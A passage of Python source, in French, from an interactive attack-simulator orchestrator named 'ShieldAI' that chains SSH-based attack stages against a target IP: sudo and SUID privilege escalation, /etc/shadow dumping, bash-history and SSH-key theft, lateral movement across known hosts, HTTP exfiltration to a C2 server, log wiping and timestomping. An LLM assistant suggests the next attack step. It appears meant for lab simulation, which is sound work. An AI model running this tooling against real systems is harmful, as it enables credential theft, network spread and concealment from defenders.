        cred = exec_data.get("selected_cred")
        if not cred:
            _err("Aucun credential SSH disponible")
            return {"continue": False}
 
        ip       = self._get_conf("ip")
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]
        _dim(f"Cred actif : {username}:{password} @ {ip}:{port}")
 
        timeout      = await _ask_float("Timeout connexion (s)", self._get_conf("privilege_escalation_timeout", 2.0))
        exec_timeout = await _ask_float("Timeout exécution (s)", self._get_conf("privilege_escalation_exec_timeout", 10.0))
 
        run_sudo = await _ask_bool("Tester Sudo Exploit ?", True)
        run_suid = await _ask_bool("Tester SUID Binary ?", True)
 
        sudo_result, suid_result = {}, {}
 
        if run_sudo:
            with console.status("[bold yellow]Sudo exploit...[/bold yellow]", spinner="dots"):
                with silence_output():
                    sudo = SudoExploit(timeout=timeout, exec_timeout=exec_timeout)
                    sudo_result = await sudo.exploit_async(ip=ip, port=port, username=username, password=password)
 
            sudo_success = sudo_result.get("results", {}).get("success_number", 0) > 0
            if sudo_success:
                slow_print("✅ Sudo exploit réussi — élévation obtenue !", style="bold green", delay=0.02)
            else:
                _warn("Sudo exploit : aucune escalade possible")
 
            self.final_result["steps_results"].setdefault("SudoExploit|PrivilegeEscalation", []).append({
                "result": sudo_result, "port": port, "ip": ip
            })
 
        if run_suid:
            with console.status("[bold yellow]SUID binary scan...[/bold yellow]", spinner="dots"):
                with silence_output():
                    suid = SUIDBinary(timeout=timeout, exec_timeout=exec_timeout)
                    suid_result = await suid.exploit_async(ip=ip, port=port, username=username, password=password)
 
            suid_success = suid_result.get("results", {}).get("success_number", 0) > 0
            if suid_success:
                slow_print("✅ SUID exploit réussi !", style="bold green", delay=0.02)
                binaries = suid_result.get("results", {}).get("exploit_success", [])
                for b in binaries:
                    _ok(f"  {b.get('name')} ({b.get('binary')})")
            else:
                _warn("SUID : aucun binaire dangereux exploitable")
 
            self.final_result["steps_results"].setdefault("SUIDBinary|PrivilegeEscalation", []).append({
                "result": suid_result, "port": port, "ip": ip
            })
 
        privesc_success = (
            sudo_result.get("results", {}).get("success_number", 0) > 0 or
            suid_result.get("results", {}).get("success_number", 0) > 0
        )
 
        return {
            "selected_cred": cred,
            "privesc_success": privesc_success,
            "sudo_result": sudo_result,
            "suid_result": suid_result,
            "continue": True,
        }
 
 
    async def credential_access(self, exec_data: Dict) -> Dict:
        _section("🔑 Credential Access — Harvest")
        slow_print("🕵️  Extraction des secrets de la machine cible...", style="bold magenta", delay=0.02)
 
        cred = exec_data.get("selected_cred")
        if not cred:
            _err("Aucun credential SSH disponible")
            return {"continue": False}
 
        ip       = self._get_conf("ip")
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]
        _dim(f"Cred actif : {username}:{password} @ {ip}:{port}")
 
        timeout      = await _ask_float("Timeout connexion (s)", self._get_conf("credential_access_timeout", 2.0))
        exec_timeout = await _ask_float("Timeout exécution (s)", self._get_conf("credential_access_exec_timeout", 10.0))
 
        run_dump    = await _ask_bool("Password File Dump (/etc/shadow) ?", True)
        run_history = await _ask_bool("Bash History Read ?", True)
        run_keys    = await _ask_bool("SSH Key Theft ?", True)
 
        dump_result, read_result, steal_result = {}, {}, {}
 
        coros = []
        if run_dump:
            coros.append(("dump",  PasswordFileDump(timeout=timeout, exec_timeout=exec_timeout).dump_async(
                ip=ip, port=port, username=username, password=password)))
        if run_history:
            coros.append(("read",  BashHistoryRead(timeout=timeout, exec_timeout=exec_timeout).read_async(
                ip=ip, port=port, username=username, password=password)))
        if run_keys:
            coros.append(("steal", SSHKeyTheft(timeout=timeout, exec_timeout=exec_timeout).steal_async(
                ip=ip, port=port, username=username, password=password)))
 
        if coros:
            with console.status("[bold magenta]Credential harvesting...[/bold magenta]", spinner="dots"):
                with silence_output():
                    results = await asyncio.gather(*[c for _, c in coros], return_exceptions=True)
 
            for (name, _), result in zip(coros, results):
                if isinstance(result, Exception):
                    _err(f"{name} : {result}")
                    continue
                if name == "dump":
                    dump_result = result
                    h = result.get("results", {}).get("hashes_count", 0)
                    if h:
                        slow_print(f"🔴 /etc/shadow lisible — {h} hash(es) extraits !", style="bold red", delay=0.015)
                    else:
                        _warn("Shadow : non accessible")
                    self.final_result["steps_results"].setdefault("PasswordFileDump|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": ip})
 
                elif name == "read":
                    read_result = result
                    c = result.get("results", {}).get("credentials_count", 0)
                    if c:
                        slow_print(f"🟠 {c} credential(s) trouvé(s) dans l'historique bash !", style="bold yellow", delay=0.015)
                    else:
                        _warn("Bash history : rien trouvé")
                    self.final_result["steps_results"].setdefault("BashHistoryRead|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": ip})
 
                elif name == "steal":
                    steal_result = result
                    k = result.get("results", {}).get("usable_keys_count", 0)
                    h = result.get("results", {}).get("known_hosts_count", 0)
                    if k:
                        slow_print(f"🔴 {k} clé(s) SSH utilisable(s) volée(s) + {h} host(s) connus !", style="bold red", delay=0.015)
                    else:
                        _warn("SSH keys : aucune clé utilisable")
                    self.final_result["steps_results"].setdefault("SSHKeyTheft|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": ip})
 
        usable_keys = steal_result.get("results", {}).get("usable_keys", [])
        known_hosts  = steal_result.get("results", {}).get("known_hosts", [])
 
        return {
            "selected_cred":  cred,
            "dump_result":    dump_result,
            "read_result":    read_result,
            "steal_result":   steal_result,
            "usable_keys":    usable_keys,
            "known_hosts":    known_hosts,
            "continue": True,
        }
 
 
    async def lateral_movement(self, cred_data: Dict) -> Dict:
        _section("🕸️  Lateral Movement — Propagation réseau")
 
        usable_keys = cred_data.get("usable_keys", [])
        known_hosts  = cred_data.get("known_hosts", [])
 
        if not usable_keys or not known_hosts:
            _warn("Pas de clés SSH utilisables ou de hosts connus — lateral movement impossible")
            return {"continue": True, "sessions": {}}
 
        slow_print(
            f"🌐 {len(usable_keys)} clé(s) × {len(known_hosts)} host(s) = propagation BFS...",
            style="bold cyan", delay=0.02
        )
 
        max_depth   = await _ask_int("Profondeur max BFS", self._get_conf("lateral_movement_max_depth", 3))
        max_workers = await _ask_int("Workers parallèles", self._get_conf("lateral_movement_max_workers", 5))
        join_timeout = await _ask_float("Timeout global (s)", self._get_conf("lateral_movement_join_timeout", 60.0))
 
        with console.status("[bold cyan]Propagation en cours...[/bold cyan]", spinner="dots"):
            with silence_output():
                lateral = SSHLateralMovement(
                    timeout=self._get_conf("credential_access_timeout", 2),
                    exec_timeout=self._get_conf("credential_access_exec_timeout", 10),
                    max_depth=max_depth,
                    max_workers=max_workers,
                    join_timeout=join_timeout,
                )
                result = await lateral.propagate_async(
                    usable_keys=usable_keys,
                    known_hosts=known_hosts,
                )
 
        sessions = result.get("results", {}).get("compromised_hosts", {})
        count    = result.get("results", {}).get("compromised_count", 0)
 
        if count:
            slow_print(f"🔴 {count} machine(s) compromise(s) !", style="bold red", delay=0.02)
            t = Table(title="Hosts compromis", box=box.ROUNDED, border_style="red", show_lines=True)
            t.add_column("Host:Port",   style="bold cyan")
            t.add_column("Username",    style="bold green")
            t.add_column("Auth",        style="bold yellow")
            for marker, info in sessions.items():
                if isinstance(info, list):
                    info = info[0]
                t.add_row(marker, info.get("username", ""), info.get("auth_method", ""))
            console.print(t)
        else:
            _warn("Aucun host compromis via lateral movement")
 
        self.final_result["steps_results"].setdefault("SSHLateralMovement|LateralMovement", []).append({
            "result": result, "ip": self._get_conf("ip")
        })
 
        return {"sessions": sessions, "lateral_result": result, "continue": True}
 
 
    async def exfiltration(self, cred_data: Dict) -> Dict:
        _section("📤 Exfiltration — Envoi vers C2")
        slow_print("📡 Exfiltration des données collectées vers le serveur C2...", style="bold red", delay=0.02)
 
        c2_url = await _ask("URL C2", self._get_conf("exfiltration_c2_url", "http://127.0.0.1:8888/exfil"))
        timeout = await _ask_float("Timeout (s)", self._get_conf("exfiltration_timeout", 10.0))
        self._set_conf("exfiltration_c2_url", c2_url)
 
        # Agréger les résultats credential access
        tactic_results = {}
        if cred_data.get("dump_result"):
            tactic_results["password_file_dump"] = cred_data["dump_result"]
        if cred_data.get("read_result"):
            tactic_results["bash_history_read"] = cred_data["read_result"]
        if cred_data.get("steal_result"):
            tactic_results["ssh_key_theft"] = cred_data["steal_result"]
 
        if not tactic_results:
            _warn("Aucune donnée à exfiltrer")
            return {"continue": True}
 
        with console.status(f"[bold red]Envoi vers {c2_url}...[/bold red]", spinner="dots"):
            with silence_output():
                exfil  = ExfiltrationHTTP(c2_url=c2_url, timeout=int(timeout))
                result = await exfil.exfil_async(
                    target_ip=self._get_conf("ip"),
                    tactic_results=tactic_results,
                )
 
        sent   = result.get("results", {}).get("sent_count", 0)
        failed = result.get("results", {}).get("failed_count", 0)
 
        if sent:
            slow_print(f"✅ {sent} payload(s) exfiltrés avec succès !", style="bold green", delay=0.02)
        if failed:
            _warn(f"{failed} payload(s) en échec")
 
        self.final_result["steps_results"].setdefault("ExfiltrationHTTP|Exfiltration", []).append({
            "result": result, "ip": self._get_conf("ip")
        })
 
        return {"exfil_result": result, "continue": True}
 
 
    async def defense_evasion(self, exec_data: Dict) -> Dict:
        _section("🧹 Defense Evasion — Effacement des traces")
        slow_print("🌑 Nettoyage des traces... personne ne saura.", style="bold white on black", delay=0.025)
 
        cred = exec_data.get("selected_cred")
        if not cred:
            _err("Aucun credential SSH disponible")
            return {"continue": False}
 
        ip       = self._get_conf("ip")
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]
 
        timeout      = await _ask_float("Timeout connexion (s)", self._get_conf("defense_evasion_timeout", 2.0))
        exec_timeout = await _ask_float("Timeout exécution (s)", self._get_conf("defense_evasion_exec_timeout", 10.0))
        run_clean    = await _ask_bool("Nettoyer les logs ?", True)
        run_stomp    = await _ask_bool("Timestomp les fichiers créés ?", True)
 
        clean_result, stomp_results = {}, []
        created_files = self._get_conf("created_files", [])
 
        if run_clean:
            with console.status("[bold white]Nettoyage logs...[/bold white]", spinner="dots"):
                with silence_output():
                    cleaner = LogCleaner(timeout=timeout, exec_timeout=exec_timeout)
                    clean_result = await cleaner.clean_async(ip=ip, port=port, username=username, password=password)
 
            success_n = clean_result.get("results", {}).get("success_number", 0)
            _ok(f"Logs nettoyés — {success_n} commande(s) réussie(s)")
            self.final_result["steps_results"].setdefault("LogCleaner|DefenseEvasion", []).append({
                "result": clean_result, "port": port, "ip": ip
            })
 
        if run_stomp and created_files:
            with console.status("[bold white]Timestomp...[/bold white]", spinner="dots"):
                with silence_output():
                    timestomp = Timestomp(timeout=timeout, exec_timeout=exec_timeout)
                    stomp_tasks = [
                        timestomp.timestomp_to_another_file(
                            ip=ip, port=port, username=username, password=password,
                            source="/bin/bash",  # date ancienne et crédible
                            target=f,
                        )
                        for f in created_files
                    ]
                    stomp_results = await asyncio.gather(*stomp_tasks, return_exceptions=True)
 
            ok_count = sum(1 for r in stomp_results if not isinstance(r, Exception))
            _ok(f"Timestamps modifiés : {ok_count}/{len(created_files)} fichier(s)")
            self.final_result["steps_results"].setdefault("Timestomp|DefenseEvasion", []).append({
                "result": {"stomped": ok_count, "files": created_files}, "port": port, "ip": ip
            })
        elif run_stomp and not created_files:
            _warn("Aucun fichier créé à timestomper")
 
        return {"clean_result": clean_result, "stomp_results": stomp_results, "continue": True}
 
 
    # ── boucle principale ─────────────────────────────────────────────────────

    async def run_interactive(self):
        _banner()
        slow_print("Bienvenue dans ShieldAI — Simulateur d'attaque interactif", style="bold cyan", delay=0.018)
     
        ip = await _ask("IP cible", self._get_conf("ip", "172.17.0.2"))
        self._set_conf("ip", ip)
        logger.remove(all_handlers=False)
        scan_data:  Dict = {}
        cred_data:  Dict = {}
        exec_data:  Dict = {}
        privesc_data: Dict = {}
        ca_data:    Dict = {}
        lateral_data: Dict = {}
        last_ia_suggestion = ""
        
        try:
            while True:
                _section("Menu principal")
                _dim(f"IP cible : {self._get_conf('ip')}")
                if last_ia_suggestion:
                    console.print(f"[bold cyan]🤖 Dernière proposition IA :[/bold cyan] [bold green]{last_ia_suggestion}[/bold green]")
                else:
                    _dim("🤖 Proposition IA : aucune suggestion pour l'instant")
                
                choice = await _ask_choice("Action :", [
                    ("1", "🔍 Reconnaissance"),
                    ("2", "🔑 Initial Access"),
                    ("3", "⚡ Execution"),
                    ("4", "🔺 Privilege Escalation"),
                    ("5", "🕵️  Credential Access"),
                    ("6", "🕸️  Lateral Movement"),
                    ("7", "📤 Exfiltration"),
                    ("8", "🧹 Defense Evasion"),
                    ("9", "💾 Persistence"),
                    ("s", "📊 État courant"),
                    ("a", "🚀 Mode automatique"),
                    ("i", "🤖 Demander une suggestion à mon assistant"), 
                    ("r", "🤖 Demander un avis à mon assistant"),
                    ("0", "🚪 Quitter"),
                ], default="1", force=True)
     
                if choice == "0":
                    break
     
                elif choice == "1":
                    scan_data = await self.reconnaissance()
     
                elif choice == "2":
                    if not scan_data:
                        _warn("Lancez d'abord la Reconnaissance (1)")
                    else:
                        cred_data = await self.initial_access(scan_data)
     
                elif choice == "3":
                    if not cred_data.get("credentials"):
                        _warn("Lancez d'abord l'Initial Access (2)")
                    else:
                        exec_data = await self.execution(cred_data["credentials"])
     
                elif choice == "4":
                    if not exec_data.get("selected_cred"):
                        _warn("Lancez d'abord l'Execution (3)")
                    else:
                        privesc_data = await self.privilege_escalation(exec_data)
                        exec_data["selected_cred"] = privesc_data.get("selected_cred", exec_data.get("selected_cred"))
     
                elif choice == "5":
                    if not exec_data.get("selected_cred"):
                        _warn("Lancez d'abord l'Execution (3)")
                    else:
                        ca_data = await self.credential_access(exec_data)
     
                elif choice == "6":
                    if not ca_data.get("usable_keys"):
                        _warn("Lancez d'abord Credential Access (5) — clés SSH nécessaires")
                    else:
                        lateral_data = await self.lateral_movement(ca_data)
     
                elif choice == "7":
                    if not ca_data:
                        _warn("Lancez d'abord Credential Access (5)")
                    else:
                        await self.exfiltration(ca_data)
     
                elif choice == "8":
                    if not exec_data.get("selected_cred"):
                        _warn("Lancez d'abord l'Execution (3)")
                    else:
                        await self.defense_evasion(exec_data)
     
                elif choice == "9":
                    if not exec_data.get("selected_cred"):
                        _warn("Lancez d'abord l'Execution (3)")
                    else:
                        await self.persistence(exec_data)
     
                elif choice == "s":
                    self.print_state()
     
                elif choice == "a":
                    _section("🚀 MODE AUTOMATIQUE COMPLET")
                    slow_print("Enchaînement automatique de toutes les étapes...", style="bold cyan", delay=0.02)
     
                    scan_data = await self.reconnaissance()
                    if not scan_data.get("continue"):
                        _err("Reconnaissance échouée — arrêt")
                        continue
     
                    cred_data = await self.initial_access(scan_data)
                    if not cred_data.get("continue"):
                        _err("Initial Access échoué — arrêt")
                        continue
     
                    exec_data = await self.execution(cred_data["credentials"])
                    if not exec_data.get("continue"):
                        _err("Execution échouée — arrêt")
                        continue
     
                    privesc_data = await self.privilege_escalation(exec_data)
                    exec_data["selected_cred"] = privesc_data.get("selected_cred", exec_data.get("selected_cred"))
     
                    ca_data = await self.credential_access(exec_data)
     
                    if ca_data.get("usable_keys") and ca_data.get("known_hosts"):
                        lateral_data = await self.lateral_movement(ca_data)
                    else:
                        _warn("Lateral movement skippé — pas de clés/hosts")
     
                    await self.exfiltration(ca_data)
                    await self.defense_evasion(exec_data)
                    await self.persistence(exec_data)
     
                    self.print_state()
                    slow_print("🎉 Attaque automatique complète terminée !", style="bold green", delay=0.025)
                    
                elif choice == "i":
                    _section("🤖 Suggestion assité")
                    #J'analyse la situation
                    with console.status("[bold cyan]Je rassemble mes idées...[/bold cyan]", spinner="dots"):
                        suggested = await self.ask_llm_decision()
                    
                    if suggested:
                        last_ia_suggestion = suggested
                        slow_print(f"💡 Je suggère de faire : {suggested}", style="bold green", delay=0.02)
                        
                        if await _ask_bool(f"Voulez-vous exécuter '{suggested}' maintenant ?", False):
                            choice = suggested
                            if suggested == "reconnaissance":
                                scan_data = await self.reconnaissance()
                            elif suggested == "initial_access":
                                if scan_data:
                                    cred_data = await self.initial_access(scan_data)
                                else:
                                    _warn("Lancez d'abord la Reconnaissance")
                            elif suggested == "execution":
                                if cred_data.get("credentials"):
                                    exec_data = await self.execution(cred_data["credentials"])
                                else:
                                    _warn("Lancez d'abord l'Initial Access")
                            elif suggested == "privilege_escalation":
                                if exec_data.get("selected_cred"):
                                    privesc_data = await self.privilege_escalation(exec_data)
                                else:
                                    _warn("Lancez d'abord l'Execution")
                            elif suggested == "credential_access":
                                if exec_data.get("selected_cred"):
                                    ca_data = await self.credential_access(exec_data)
                                else:
                                    _warn("Lancez d'abord l'Execution")
                                    
                            elif suggested == "lateral_movement":
                                if ca_data.get("usable_keys"):
                                    lateral_data = await self.lateral_movement(ca_data)
                                else:
                                    _warn("Lancez d'abord Credential Access")
                                    
                            elif suggested == "exfiltration":
                                if ca_data:
                                    await self.exfiltration(ca_data)
                                else:
                                    _warn("Lancez d'abord Credential Access")
                                    
                            elif suggested == "defense_evasion":
                                if exec_data.get("selected_cred"):
                                    await self.defense_evasion(exec_data)
                                else:
                                    _warn("Lancez d'abord l'Execution")
                                    
                            elif suggested == "persistence":
                                if exec_data.get("selected_cred"):
                                    await self.persistence(exec_data)
                                else:
                                    _warn("Lancez d'abord l'Execution")
                                    
                    else:
                        _warn("J'ai pas de suggestion claire")
                
                elif choice == "r":
                    _section("🤖 Demander un avis à mon assistant")
                    
                    _dim("Actions possibles : " + ", ".join(ALL_ACTIONS))
                    
                    user_action = await _ask("Quelle action voulez-vous évaluer ?", completer=WordCompleter(ALL_ACTIONS))
                    
                    if user_action in ALL_ACTIONS:
                        with console.status("[bold cyan]J'analyse la situation...[/bold cyan]", spinner="dots"):
                            review = await self.ask_llm_review(user_action)
                        
                        console.print()
                        console.print(Panel(
                            review,
                            title=f"🤖 Avis sur '{user_action}'",
                            border_style="cyan",
                            padding=(1, 2)
                        ))
                        console.print()
                    else:
                        _err(f"Action '{user_action}' inconnue")
     
        except KeyboardInterrupt:
            _warn("Interruption — retour au menu")
     
        except Exception as e:
            _err(f"Erreur : {e}")
            console.print_exception()
     
        _section("Fin de session")
        self.print_state()
        slow_print("Session terminée. Merci d'utiliser ShieldAI V2 🛡", style="bold cyan", delay=0.02)
     
        # logger.setup(logger.logger.level, logger.structured)
        return self.final_result
 



if __name__ == "__main__":
    # asyncio.run(InteractiveTerminalOrchestrator(None).run_interactive())
    from simulateur_attaque_ia.simulateur_utils.logger import get_logger
    with silence_output() as (out, err):
        # Les logs loguru sont aussi redirigés
        get_logger().print("Ceci ne s'affichera pas")
    get_logger().print("Ceci s'affichera")